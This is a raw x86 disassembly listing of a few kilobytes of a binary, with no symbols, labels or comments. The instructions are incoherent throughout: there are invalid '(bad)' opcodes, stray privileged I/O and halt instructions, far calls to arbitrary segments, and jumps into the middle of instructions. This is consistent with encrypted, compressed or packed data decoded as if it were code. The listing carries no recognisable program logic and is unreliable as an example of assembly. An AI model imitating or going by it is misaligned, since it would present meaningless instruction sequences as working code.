  415efa:	popf   
  415efb:	test   bh,0x9e
  415efe:	mov    ch,0x13
  415f00:	imul   edx,DWORD PTR [ecx],0xffffffc5
  415f03:	sti    
  415f04:	xor    eax,DWORD PTR [esi+0x361d6864]
  415f0a:	cs ja  0x415ef9
  415f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f0e:	outs   dx,DWORD PTR ds:[esi]
  415f0f:	xchg   ecx,eax
  415f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f11:	mov    al,0xc1
  415f13:	fldenv [ecx-0x4569bf25]
  415f19:	cmp    ah,dh
  415f1b:	mov    bl,0x6b
  415f1d:	js     0x415ed5
  415f1f:	in     al,dx
  415f20:	xchg   ebp,eax
  415f21:	inc    esi
  415f22:	std    
  415f23:	mov    ds:0x15e761c3,al
  415f28:	ror    BYTE PTR [ebp+edi*4-0x6ff8c500],1
  415f2f:	mov    ds:0x5283060c,al
  415f34:	call   0xa280:0x8e58c30
  415f3b:	ins    BYTE PTR es:[edi],dx
  415f3c:	xchg   ebx,eax
  415f3d:	cmp    ah,cl
  415f3f:	or     al,0x95
  415f41:	lods   eax,DWORD PTR ds:[esi]
  415f42:	mov    ds:0x999f76,eax
  415f47:	push   esp
  415f48:	(bad)  
  415f49:	mov    ebp,0x45ca9f20
  415f4e:	mov    ch,0x59
  415f50:	pushf  
  415f51:	aad    0x41
  415f53:	jbe    0x415ef2
  415f55:	hlt    
  415f56:	xor    al,0x5a
  415f58:	pop    ss
  415f59:	jmp    0x415fd6
  415f5b:	test   esi,eax
  415f5d:	mov    dh,BYTE PTR [eax+0x1]
  415f60:	clc    
  415f61:	adc    BYTE PTR [eax],dl
  415f63:	aas    
  415f64:	sar    BYTE PTR [esi+0x2b00220b],1
  415f6a:	lahf   
  415f6b:	push   0xffffffdd
  415f6d:	or     esi,ecx
  415f6f:	cli    
  415f70:	sbb    BYTE PTR [edx+0x42],ch
  415f73:	push   ss
  415f74:	cmp    BYTE PTR [ebx-0x50b2aa60],ah
  415f7a:	xchg   esp,eax
  415f7b:	mov    bh,0x1f
  415f7d:	sub    BYTE PTR [ebp-0x7],ah
  415f80:	int    0xc3
  415f82:	jecxz  0x415f08
  415f84:	jno    0x415fbe
  415f86:	mov    ebx,0x788a1eba
  415f8b:	stc    
  415f8c:	and    ebx,0x5c21d436
  415f92:	and    edi,DWORD PTR [eax-0x39c6c1b]
  415f98:	out    dx,al
  415f99:	cwde   
  415f9a:	jns    0x415fce
  415f9c:	adc    eax,0x74f85759
  415fa1:	pop    edi
  415fa2:	sbb    DWORD PTR [ebp-0x3eb39e51],0xcb79dac9
  415fac:	in     al,dx
  415fad:	pop    edi
  415fae:	push   cs
  415faf:	call   0xa6b5:0x200d85dd
  415fb6:	jmp    0x415f71
  415fb8:	repnz mov esi,0x1c3e50f
  415fbe:	ja     0x415fbe
  415fc0:	adc    eax,esi
  415fc2:	popf   
  415fc3:	int    0xa1
  415fc5:	add    BYTE PTR [esi],ch
  415fc7:	inc    ebp
  415fc8:	fs pop es
  415fca:	shl    al,0x1d
  415fcd:	dec    ecx
  415fce:	icebp  
  415fcf:	out    dx,eax
  415fd0:	push   es
  415fd1:	sub    BYTE PTR [edx-0x6f],cl
  415fd4:	cmc    
  415fd5:	loope  0x415f7a
  415fd7:	fwait
  415fd8:	sub    ch,BYTE PTR [edx+0x5cf863e1]
  415fde:	les    edi,FWORD PTR [ebp-0x2e408955]
  415fe4:	sbb    eax,0x44d9d82a
  415fe9:	sub    esp,ebx
  415feb:	jecxz  0x415f88
	...
  416055:	add    BYTE PTR [edi],dl
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	fild   QWORD PTR [edx]
  416064:	cmp    cl,ch
  416066:	push   ecx
  416067:	in     eax,dx
  416068:	add    BYTE PTR [eax],al
  41606a:	inc    DWORD PTR [eax]
  41606c:	add    BYTE PTR [eax],al
  41606e:	jne    0x416071
  416070:	jge    0x4160b0
  416072:	aas    
  416073:	sub    ebx,DWORD PTR [edi+0x42eb14a1]
  416079:	sbb    al,0xf2
  41607b:	fisub  WORD PTR fs:[esp+eax*4+0x5c]
  416080:	sbb    esi,DWORD PTR [esi+0x3d]
  416083:	jb     0x416016
  416085:	push   edx
  416086:	inc    esp
  416087:	jno    0x41606a
  416089:	rcr    BYTE PTR [esp-0x51efa46d],0x26
  416091:	test   eax,ebp
  416093:	jae    0x416104
  416095:	lds    ebp,FWORD PTR [edx-0x16e51bec]
  41609b:	repz push edi
  41609d:	enter  0xcab5,0x7a
  4160a1:	dec    ecx
  4160a2:	inc    ebp
  4160a3:	aaa    
  4160a4:	add    eax,0x832ffeaf
  4160a9:	stc    
  4160aa:	inc    ebp
  4160ab:	mov    edx,0xc8f5684a
  4160b0:	push   es
  4160b1:	adc    cl,BYTE PTR [ebp-0x37]
  4160b4:	cs loope 0x416072
  4160b7:	out    dx,eax
  4160b8:	test   DWORD PTR [eax],ebx
  4160ba:	xchg   edx,eax
  4160bb:	les    ebp,FWORD PTR [ebx-0x54]
  4160be:	(bad)  
  4160bf:	sub    edi,DWORD PTR [ecx]
  4160c1:	inc    eax
  4160c2:	lds    edx,FWORD PTR [eax-0x17]
  4160c5:	mov    esp,0xed8e8c89
  4160ca:	xchg   ebp,eax
  4160cb:	cdq    
  4160cc:	in     eax,dx
  4160cd:	push   es
  4160ce:	adc    DWORD PTR [eax+0x56],edx
  4160d1:	xor    eax,0xfa737705
  4160d6:	or     DWORD PTR [ecx],0x3484100e
  4160dc:	mov    WORD PTR [esi+0x53],?
  4160df:	(bad)  [edx]
  4160e1:	xor    eax,0xf5c75e45
  4160e6:	add    eax,0xe2311f4d
  4160eb:	push   edi
  4160ec:	ins    DWORD PTR es:[edi],dx
  4160ed:	shl    ebp,1
  4160ef:	test   DWORD PTR [edx+0x2d],edx
  4160f2:	in     eax,dx
  4160f3:	into   
  4160f4:	pop    ebp
  4160f5:	in     al,0x94
  4160f7:	idiv   DWORD PTR [ebp+0x5c1f3223]
  4160fd:	inc    ebx
  4160fe:	cmp    DWORD PTR [edi+0x4f8a4de6],0xa1e0c051
  416108:	mov    BYTE PTR [ecx-0x1a],cl
  41610b:	loop   0x4160a2
  41610d:	in     eax,dx
  41610e:	mov    edx,0x87281b35
  416113:	add    esi,DWORD PTR [ecx+0x41]
  416116:	arpl   WORD PTR [ecx+0x70],dx
  416119:	aas    
  41611a:	or     eax,0xe8fb7d64
  41611f:	(bad)  
  416120:	jae    0x4160c2
  416122:	jmp    0x4160bf
  416124:	test   BYTE PTR [eax+esi*1],cl
  416127:	push   ebx
  416128:	inc    ecx
  416129:	push   esp
  41612a:	fwait
  41612b:	mov    cl,0x32
  41612d:	das    
  41612e:	ds xchg esp,eax
  416130:	repnz inc eax
  416132:	(bad)  
  416133:	icebp  
  416134:	mov    bh,0x87
  416136:	dec    edi
  416137:	sbb    DWORD PTR [esi+0x26d72855],edx
  41613d:	cwde   
  41613e:	jmp    0x416126
  416140:	int    0x7e
  416142:	push   ebx
  416143:	or     cl,BYTE PTR [eax-0x5cb4773f]
  416149:	mov    ch,0x39
  41614b:	inc    ebx
  41614c:	mov    esp,0xd7e6b22a
  416151:	outs   dx,DWORD PTR ds:[esi]
  416152:	xchg   edx,eax
  416153:	push   0xffffff8f
  416155:	or     eax,0x23da7ef2
  41615a:	outs   dx,BYTE PTR ds:[esi]
  41615b:	ins    DWORD PTR es:[edi],dx
  41615c:	mov    BYTE PTR [esi+0x4e],dh
  41615f:	pop    esi
  416160:	popa   
  416161:	stc    
  416162:	fld    QWORD PTR [ebx-0x2e5f8d1c]
  416168:	dec    ecx
  416169:	popa   
  41616a:	(bad)  
  41616b:	push   eax
  41616c:	stos   DWORD PTR es:[edi],eax
	...
  4161d5:	add    BYTE PTR [eax],ah
  4161d7:	jmp    0xdf3d4017
  4161dc:	in     eax,0xff
  4161de:	(bad)  
  4161df:	push   edx
  4161e0:	sub    eax,0xc0295af3
  4161e5:	out    dx,eax
  4161e6:	push   eax
  4161e7:	out    dx,al
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	inc    DWORD PTR [eax]
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	je     0x41624a
  4161f0:	push   ss
  4161f1:	rcr    ebp,0x3a
  4161f4:	add    eax,0x889f0f3b
  4161f9:	(bad)  
  4161fa:	mov    ds:0x79047491,eax
  4161ff:	xchg   ah,bh
  416201:	mov    cl,BYTE PTR [ecx]
  416203:	dec    ebx
  416204:	test   eax,0x79bd5aca
  416209:	add    eax,0x57573aa3
  41620e:	loope  0x4161a3
  416210:	test   DWORD PTR [esi],edi
  416212:	xor    ecx,DWORD PTR [edx+eax*8+0x34f27d2]
  416219:	and    esi,esp
  41621b:	adc    al,BYTE PTR [ecx+0x51]
  41621e:	test   eax,0x1bcf5c6b
  416223:	cmc    
  416224:	(bad)  
  416225:	sbb    ecx,ebx
  416227:	xor    esi,DWORD PTR [edi+0x3032f1ee]
  41622d:	push   es
  41622e:	fisttp DWORD PTR [esi+0x1a]
  416231:	mov    dl,0xb2
  416233:	push   es
  416234:	fsub   QWORD PTR [edx]
  416236:	xor    BYTE PTR [esi+0x4a3afacd],dh
  41623c:	pop    ebx
  41623d:	mov    esp,0x1d26ea55
  416242:	adc    DWORD PTR [edx-0x1eb10010],esi
  416248:	xchg   DWORD PTR [ecx],ebp
  41624a:	fcmovb st,st(2)
  41624c:	jo     0x4161ea
  41624e:	sahf   
  41624f:	cmp    al,0x2a
  416251:	mov    cl,0xcf
  416253:	femms  
  416255:	push   edi
  416256:	dec    eax
  416257:	cld    
  416258:	pop    esp
  416259:	repz mov eax,0x3e8aa895
  41625f:	sub    BYTE PTR [ebx-0x6c],al
  416262:	cdq    
  416263:	bound  edx,QWORD PTR [eax]
  416265:	cmc    
  416266:	in     al,0x48
  416268:	mov    ah,0x1f
  41626a:	or     ebp,DWORD PTR ds:0x52d3a23d
  416270:	mov    ch,0xf3
  416272:	(bad)  
  416273:	into   
  416274:	lea    ebx,[edx+ecx*8+0x47]
  416278:	xchg   edx,eax
  416279:	mov    al,0x3
  41627b:	lock sub bh,BYTE PTR [ebp-0x1d]
  41627f:	sbb    DWORD PTR [eax],eax
  416281:	retf   0x4ad1
  416284:	xor    ebx,edx
  416286:	popf   
  416287:	mov    esp,0x57566f0b
  41628c:	and    al,0x43
  41628e:	dec    eax
  41628f:	loop   0x41627e
  416291:	xor    al,0xa2
  416293:	mov    ah,0x4b
  416296:	clc    
  416297:	mov    ebx,0x579ebd99
  41629c:	mov    bl,0x73
  41629e:	dec    edx
  41629f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162a0:	sti    
  4162a1:	mov    ds:0xa1090eae,al
  4162a6:	out    0x11,al
  4162a8:	addr16 inc edx
  4162aa:	outs   dx,BYTE PTR ds:[esi]
  4162ab:	sbb    eax,0x73acf6b6
  4162b0:	pop    ss
  4162b1:	dec    eax
  4162b2:	int    0xc3
  4162b4:	out    dx,al
  4162b5:	das    
  4162b6:	or     eax,0xa224b0a5
  4162bb:	mov    WORD PTR [esi],gs
  4162bd:	cmp    BYTE PTR [edx],al
  4162bf:	inc    eax
  4162c0:	jbe    0x41624a
  4162c2:	mov    eax,ds:0xab2b4c84
  4162c7:	mov    ebx,0x9a18faeb
  4162cc:	bound  eax,QWORD PTR [ebx+edx*1+0x73be5bea]
  4162d3:	les    ebx,FWORD PTR [ebp-0x1e]
  4162d6:	nop
  4162d7:	mov    ebp,0x42bccbb3
  4162dc:	inc    bx
  4162de:	loop   0x416273
  4162e0:	(bad)  
  4162e1:	sub    edx,ebp
  4162e3:	jl     0x416305
  4162e5:	arpl   WORD PTR [edx+0x35],ax
  4162e8:	in     eax,0xd3
  4162ea:	aam    0x2
  4162ec:	aas    
	...
  416355:	add    BYTE PTR [ebx],ah
  416357:	outs   dx,BYTE PTR ds:[esi]
  416358:	xor    ah,BYTE PTR ds:0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x4fa0:0x701840ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	inc    DWORD PTR [eax]
  41636c:	add    BYTE PTR [eax],al
  41636e:	sub    ecx,ecx
  416370:	call   DWORD PTR [eax+0x1c18875]
  416376:	dec    ebp
  416377:	fadd   st,st(4)
  416379:	sbb    ah,al
  41637b:	push   esi
  41637c:	jb     0x4163b7
  41637e:	es out dx,al
  416380:	out    0x7a,al
  416382:	pop    ebp
  416383:	ja     0x41631d
  416385:	dec    eax
  416386:	outs   dx,DWORD PTR ds:[esi]
  416387:	out    dx,eax
  416388:	into   
  416389:	or     DWORD PTR [edi+0x6dac7b6f],edx
  41638f:	mov    ah,0x81
  416391:	imul   edx,esi,0x6e432501
  416397:	mov    ds:0xe560c935,al
  41639c:	sbb    ecx,DWORD PTR ds:0xeca617b1
  4163a2:	add    bh,BYTE PTR [ebx-0x12]
  4163a5:	sub    bl,BYTE PTR [edx+eiz*1]
  4163a8:	daa    
  4163a9:	stc    
  4163aa:	fadd   QWORD PTR [esi+edx*2+0x7d]
  4163ae:	(bad)  
  4163af:	sub    DWORD PTR [eax-0x49],edx
  4163b2:	cmp    dh,BYTE PTR [eax+0x752aabbc]
  4163b8:	hlt    
  4163b9:	mov    cl,0x64
  4163bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163bc:	jmp    0x12ab:0x5a4ae180
  4163c3:	ret    
  4163c4:	bound  ebp,QWORD PTR [eax]
  4163c6:	mov    ebp,0x743ef92b
  4163cb:	fwait
  4163cc:	in     al,0x39
  4163ce:	fadd   st,st(4)
  4163d0:	dec    sp
  4163d2:	in     al,dx
  4163d3:	inc    edx
  4163d4:	and    edi,DWORD PTR [edi+0x56]
  4163d7:	jnp    0x416370
  4163d9:	shl    DWORD PTR [ecx+0x292efcbf],0x40
  4163e0:	jo     0x4163df
  4163e2:	xchg   edx,eax
  4163e3:	or     ecx,ecx
  4163e5:	fcomp  QWORD PTR [eax+0x9]
  4163e8:	push   eax
  4163e9:	pushf  
  4163ea:	sub    esp,ebx
  4163ec:	mov    eax,0xe92b22ad
  4163f1:	sub    BYTE PTR [ecx-0x150bfc66],0xbc
  4163f8:	mov    bh,0xed
  4163fa:	push   esp
  4163fb:	out    0x61,eax
  4163fd:	push   edx
  4163fe:	pop    es
  4163ff:	loopne 0x4163c6
  416401:	xchg   BYTE PTR [edx-0xc],dl
  416404:	lock push eax
  416406:	sbb    cl,BYTE PTR [eax]
  416408:	inc    ecx
  416409:	js     0x416444
  41640b:	out    0xd2,al
  41640d:	mov    DWORD PTR [edi-0x5],ecx
  416410:	data16 fisttp QWORD PTR [esp+edx*8]
  416414:	icebp  
  416415:	ror    BYTE PTR [eax+0x1971cfb0],1
  41641b:	adc    al,dh
  41641d:	fisttp QWORD PTR [ebp+0x13]
  416420:	sub    DWORD PTR [ebx-0x27],esp
  416423:	sub    bh,cl
  416425:	dec    ecx
  416426:	xchg   edi,eax
  416427:	mov    bh,0x4f
  416429:	add    BYTE PTR fs:[ecx+0x4e8a75ce],0x2
  416431:	fsubr  QWORD PTR [esi]
  416433:	stos   BYTE PTR es:[edi],al
  416434:	cmp    DWORD PTR [edi],0xc32eece1
  41643a:	div    eax
  41643c:	mov    ebp,0x13407a07
  416441:	idiv   BYTE PTR ds:0x9d27fb8f
  416447:	retf   0x626d
  41644a:	fdivr  st,st(7)
  41644c:	out    dx,eax
  41644d:	add    BYTE PTR [edi-0x73],cl
  416450:	cli    
  416451:	adc    BYTE PTR [ebp-0x6efdf6dd],cl
  416457:	push   0xbc531c9b
  41645c:	jo     0x41648a
  41645e:	inc    esp
  41645f:	imul   esp,edi,0xfd5c837a
  416465:	jmp    0x416432
  416467:	adc    bl,al
  416469:	adc    DWORD PTR [ecx-0x4e],esi
  41646c:	pushf  
	...
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	cmp    eax,DWORD PTR [ecx-0xfb15355]
  4164e8:	add    BYTE PTR [eax],al
  4164ea:	inc    DWORD PTR [eax]
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	pop    edi
  4164ef:	dec    edx
  4164f0:	xchg   esp,eax
  4164f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f2:	push   esi
  4164f3:	adc    dh,BYTE PTR [eax-0x7d]
  4164f6:	xor    al,0x4c
  4164f8:	dec    ecx
  4164f9:	cdq    
  4164fa:	call   0xb69d:0x38ef1fb1
  416501:	mov    al,cl
  416503:	push   edi
  416504:	ror    BYTE PTR [ebx+0x7c94d7a6],0x9c
  41650b:	mov    db2,ebp
  41650e:	inc    ebx
  41650f:	icebp  
  416510:	push   cs
  416511:	xchg   dl,cl
  416513:	inc    ecx
  416514:	and    eax,0xd2616369
  416519:	or     ebx,eax
  41651b:	xchg   edx,eax
  41651c:	hlt    
  41651d:	mov    cl,0x35
  41651f:	jne    0x41655e
  416521:	scas   eax,DWORD PTR es:[edi]
  416522:	push   cs
  416523:	pop    ecx
  416524:	sahf   
  416525:	sbb    bh,BYTE PTR [esi-0x2ce5fb64]
  41652b:	xor    eax,0x9adab5dd
  416530:	push   ecx
  416531:	xchg   ebx,eax
  416532:	mov    WORD PTR [edx+0x4e86b5c1],fs
  416538:	push   edi
  416539:	cmc    
  41653a:	jne    0x416568
  41653c:	addr16 or al,0x67
  41653f:	aam    0xc1
  416541:	jne    0x41657b
  416543:	xchg   esi,eax
  416544:	pop    edi
  416545:	pop    ebx
  416546:	or     eax,0x40baa8a8
  41654b:	aaa    
  41654c:	ja     0x4164fe
  41654e:	and    eax,0x1d878d30
  416553:	add    DWORD PTR [esp+ecx*2],edi
  416556:	cmp    bh,BYTE PTR [eax-0x5514ae80]
  41655c:	xor    DWORD PTR [ecx+0x7039187a],edx
  416562:	stos   DWORD PTR es:[edi],eax
  416563:	push   eax
  416564:	fimul  DWORD PTR [ecx+0x46]
  416567:	(bad)  
  416568:	pop    ds
  416569:	xor    eax,0x3f9d8355
  41656e:	add    al,ch
  416570:	je     0x41652e
  416572:	in     eax,dx
  416573:	inc    eax
  416574:	xchg   ebx,eax
  416575:	lods   al,BYTE PTR ds:[esi]
  416576:	fmul   QWORD PTR [ecx]
  416578:	push   esp
  416579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41657a:	or     BYTE PTR [ebx-0x4a],al
  41657d:	jns    0x416574
  41657f:	fstp   TBYTE PTR [ecx+0x11c07b82]
  416585:	or     BYTE PTR gs:[eax],dh
  416588:	jmp    0x4165e4
  41658a:	ja     0x416523
  41658c:	inc    edx
  41658d:	jmp    0x4165d9
  41658f:	inc    eax
  416590:	test   cl,bh
  416592:	push   ecx
  416593:	pop    ecx
  416594:	push   eax
  416595:	cmp    bl,BYTE PTR [esi-0xc356d82]
  41659b:	dec    ebp
  41659c:	dec    esi
  41659d:	add    dl,BYTE PTR [ecx+ebx*2]
  4165a0:	and    dl,BYTE PTR [ecx+0x1caa4863]
  4165a6:	jae    0x4165a2
  4165a8:	fcomp  QWORD PTR [ecx+esi*8]
  4165ab:	adc    ch,dh
  4165ad:	mov    BYTE PTR [ebp-0x63],0x94
  4165b1:	test   al,0x1a
  4165b3:	(bad)  
  4165b4:	iret   
  4165b5:	loope  0x4165db
  4165b7:	test   DWORD PTR [edi-0x79],esi
  4165ba:	or     DWORD PTR [edx],0x3e5c9f45
  4165c0:	mov    esi,edx
  4165c2:	push   0xffffff97
  4165c4:	or     ebp,DWORD PTR [eax-0x29]
  4165c7:	sub    eax,0xa4f04c
  4165cc:	adc    ecx,DWORD PTR [edx-0x5d]
  4165cf:	or     eax,0x8a787c9d
  4165d4:	test   DWORD PTR [ebp-0x5a],ecx
  4165d7:	retf   
  4165d8:	adc    eax,0xc69f19ed
  4165dd:	lds    esi,FWORD PTR [ebx-0x411c8b1a]
  4165e3:	ficomp WORD PTR [ecx+0x2d]
  4165e6:	out    0x87,eax
  4165e8:	push   ecx
  4165e9:	inc    esi
  4165ea:	jg     0x4165fd
  4165ec:	outs   dx,BYTE PTR ds:[esi]
	...
  416655:	add    BYTE PTR ds:0xfff32bd8,ah
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi+0x494fbcac]
  416663:	push   ecx
  416664:	popa   
  416665:	daa    
  416666:	dec    ebp
  416667:	icebp  
  416668:	add    BYTE PTR [eax],al
  41666a:	inc    DWORD PTR [eax]
  41666c:	add    BYTE PTR [eax],al
  41666e:	adc    esp,esi
  416670:	(bad)  
  416671:	jp     0x41666d
  416673:	xchg   DWORD PTR [edx-0x3d],ebx
  416676:	push   esp
  416677:	push   ebx
  416678:	jno    0x416648
  41667a:	push   0xffffffd3
  41667c:	(bad)  
  41667d:	stos   DWORD PTR es:[edi],eax
  41667e:	xchg   DWORD PTR [edx],esp
  416680:	mov    bh,0x9a
  416682:	loopne 0x416640
  416684:	cmp    DWORD PTR [edi-0x2fbb1795],0x4b
  41668b:	scas   eax,DWORD PTR es:[edi]
  41668c:	mov    al,0xd8
  41668e:	xchg   ebx,eax
  41668f:	xchg   ecx,eax
  416690:	xor    dl,0xe9
  416693:	data16 sar BYTE PTR [esi+esi*2+0x1d],0xb5
  416699:	dec    ebp
  41669a:	in     al,dx
  41669b:	or     bl,dh
  41669d:	ins    DWORD PTR es:[edi],dx
  41669e:	or     BYTE PTR [edi-0x7e65c946],dh
  4166a4:	pushf  
  4166a5:	bts    ebp,edi
  4166a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166a9:	test   eax,0xe3d44790
  4166ae:	adc    cl,BYTE PTR [eax-0x46]
  4166b1:	idiv   DWORD PTR [ebp-0x18986f20]
  4166b7:	jbe    0x4166ce
  4166b9:	or     ecx,ebp
  4166bb:	mov    ecx,DWORD PTR [esi+0x36]
  4166be:	add    ebp,DWORD PTR [ecx]
  4166c0:	inc    ebp
  4166c2:	push   eax
  4166c3:	add    DWORD PTR [eax+ebx*8+0x519bb1a2],0x8611ccd7
  4166ce:	cmp    eax,0x1e709aca
  4166d3:	inc    eax
  4166d4:	pop    edi
  4166d5:	xchg   ecx,eax
  4166d6:	and    dl,BYTE PTR [edi-0x524a20bb]
  4166dc:	or     DWORD PTR [edi],0x844d906f
  4166e2:	imul   ecx,DWORD PTR [edi],0xc83393d2
  4166e8:	or     BYTE PTR [ebx+0x85b43eb],bl
  4166ee:	retf   
  4166ef:	ss and esp,ecx
  4166f2:	call   0xad075ba3
  4166f7:	cmp    eax,0xdafaee2f
  4166fc:	jp     0x41667f
  4166fe:	retf   
  4166ff:	fst    DWORD PTR fs:[esi+esi*1-0x4c]
  416704:	cwde   
  416705:	mov    ds:0x6f707488,al
  41670a:	jo     0x4166e4
  41670c:	ror    DWORD PTR [ebp-0x6ba0b5b1],0x1f
  416713:	adc    al,0x54
  416715:	or     BYTE PTR [ebp+edx*2-0x7af58655],cl
  41671c:	xchg   ebp,eax
  41671d:	repz lahf 
  41671f:	mov    ebp,ebx
  416721:	jbe    0x4166c0
  416723:	pop    eax
  416724:	xor    ebx,ecx
  416726:	mov    al,ds:0x5d4083b8
  41672b:	xchg   esp,eax
  41672c:	sub    dl,BYTE PTR [ecx+0x4ad2698e]
  416732:	pushf  
  416733:	mov    dh,0xdd
  416735:	xchg   esp,edx
  416737:	mov    dl,0x3
  416739:	cmp    BYTE PTR [ebx+esi*1-0x29ed64a7],al
  416740:	xor    DWORD PTR [ecx],ebx
  416742:	push   edi
  416743:	or     bl,dl
  416745:	push   cs
  416746:	mov    dh,0x6c
  416748:	cmp    ecx,DWORD PTR [ecx-0x362935b8]
  41674e:	pop    ecx
  41674f:	faddp  st(2),st
  416751:	test   ah,al
  416753:	jno    0x4167b8
  416755:	retf   
  416756:	imul   edi,DWORD PTR [ebp-0x35],0xa845ed20
  41675d:	fbstp  TBYTE PTR [edx]
  41675f:	call   0x79332e16
  416764:	fdivp  st(1),st
  416766:	add    ebp,ebp
  416768:	and    dl,bh
  41676a:	push   ax
  41676c:	cwde   
	...
  4167d5:	add    ah,al
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	dec    esi
  4167e3:	adc    edi,DWORD PTR [ecx]
  4167e5:	iret   
  4167e6:	dec    esp
  4167e7:	repnz add BYTE PTR [eax],al
  4167ea:	inc    DWORD PTR [eax]
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	or     al,0xc6
  4167f0:	cmp    DWORD PTR [ecx+0x4c],ecx
  4167f3:	jb     0x41679e
  4167f5:	popf   
  4167f6:	out    0x96,eax
  4167f8:	or     edx,DWORD PTR [edx-0x32b0569]
  4167fe:	sub    eax,0x5817b88b
  416803:	ins    BYTE PTR es:[edi],dx
  416804:	ficomp WORD PTR [edi]
  416806:	stc    
  416807:	xor    DWORD PTR [esi-0x55],0x4bdeff8f
  41680e:	push   ebp
  41680f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416810:	popa   
  416811:	test   DWORD PTR [edi],edx
  416813:	repz push 0xffffff9e
  416816:	loopne 0x416811
  416818:	add    edi,DWORD PTR ds:0x66724283
  41681e:	aas    
  41681f:	mov    bh,0xad
  416821:	sbb    DWORD PTR [edi-0x22],esp
  416824:	adc    BYTE PTR [ecx],al
  416826:	inc    ecx
  416827:	repnz out 0xc8,eax
  41682a:	or     ebp,DWORD PTR [ebx-0x2c84992d]
  416830:	jl     0x416888
  416832:	lods   al,BYTE PTR ds:[esi]
  416833:	dec    ecx
  416834:	fwait
  416835:	stos   DWORD PTR es:[edi],eax
  416836:	and    cl,dh
  416838:	inc    esi
  416839:	cmp    DWORD PTR [esi],ecx
  41683b:	sub    ch,BYTE PTR [ebp+0x3994b63f]
  416841:	lahf   
  416842:	int3   
  416843:	or     bh,BYTE PTR [edx+edx*2-0x7]
  416847:	pop    esp
  416848:	jl     0x4167cd
  41684a:	rol    DWORD PTR [edi+0x19],cl
  41684d:	inc    ebx
  41684e:	jae    0x4168a6
  416850:	adc    bh,cl
  416852:	mov    edx,0xbfd02d79
  416857:	jp     0x416876
  416859:	mov    al,0xea
  41685b:	dec    edi
  41685c:	imul   DWORD PTR [esi]
  41685e:	dec    ebx
  41685f:	mov    ebx,0x16093b2d
  416864:	loop   0x416815
  416866:	adc    al,0xde
  416868:	mov    edi,0x39e1ce03
  41686d:	aad    0x64
  41686f:	ins    DWORD PTR es:[edi],dx
  416870:	or     BYTE PTR [ebx-0x623e6381],bl
  416876:	mov    bl,BYTE PTR [edx-0x2128faaf]
  41687c:	or     dl,BYTE PTR [esp+edi*1]
  41687f:	or     ebp,ebp
  416881:	outs   dx,DWORD PTR ds:[esi]
  416882:	push   esp
  416883:	xor    edi,eax
  416885:	push   esi
  416886:	cmp    eax,DWORD PTR [ecx-0x2f]
  416889:	rol    dh,0x44
  41688c:	jno    0x4168e4
  41688e:	push   esi
  41688f:	out    0xab,al
  416891:	call   0xf9a9:0x1652b1b6
  416898:	lods   eax,DWORD PTR ds:[esi]
  416899:	test   BYTE PTR [ebx+0x5ebe6b88],ch
  41689f:	inc    ebx
  4168a0:	inc    edx
  4168a1:	xchg   ebx,eax
  4168a2:	shr    DWORD PTR [ebx],1
  4168a4:	repnz or BYTE PTR [esi-0x4876fa1f],cl
  4168ab:	push   ecx
  4168ac:	push   ebp
  4168ad:	cli    
  4168ae:	sub    DWORD PTR [edx],esp
  4168b0:	push   ss
  4168b1:	aaa    
  4168b2:	aaa    
  4168b3:	dec    ecx
  4168b4:	fwait
  4168b5:	pop    esi
  4168b6:	inc    ebx
  4168b7:	xor    BYTE PTR [eax+0x24],dl
  4168ba:	fwait
  4168bb:	sbb    eax,0xf6deb105
  4168c0:	jne    0x416864
  4168c2:	imul   eax,ebp,0x66
  4168c5:	aam    0x44
  4168c7:	xor    dl,BYTE PTR [ebp+0x7f]
  4168ca:	cmp    ebp,DWORD PTR [ebx]
  4168cc:	sbb    eax,DWORD PTR [ecx]
  4168ce:	add    cl,cl
  4168d0:	addr16 popa 
  4168d2:	out    dx,al
  4168d3:	push   ecx
  4168d4:	popf   
  4168d5:	clc    
  4168d6:	push   0x1a7b53af
  4168db:	add    eax,0x864cd000
  4168e0:	(bad)  
  4168e1:	not    al
  4168e3:	cwde   
  4168e4:	mov    ecx,0xd54de347
  4168e9:	pop    es
  4168ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168eb:	jo     0x416950
	...
  416955:	add    cl,dl
  416957:	scas   eax,DWORD PTR es:[edi]
  416958:	push   es
  416959:	repz jle 0x416957
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x2feda279
  416966:	dec    ebx
  416967:	repz add BYTE PTR [eax],al
  41696a:	inc    DWORD PTR [eax]
  41696c:	add    BYTE PTR [eax],al
  41696e:	inc    ecx
  41696f:	out    0x1d,eax
  416971:	(bad)  
  416972:	fucom  st(5)
  416974:	adc    bl,BYTE PTR [eax-0x7b09c6b9]
  41697a:	pop    esi
  41697b:	or     eax,0xcc8cbbfc
  416980:	jmp    0x4169d6
  416982:	ror    DWORD PTR [eax-0x4da619f8],cl
  416988:	dec    ecx
  416989:	pop    ebx
  41698a:	mov    ss,WORD PTR [ecx-0x5c]
  41698d:	jge    0x4169a5
  41698f:	lock sti 
  416991:	scas   eax,DWORD PTR es:[edi]
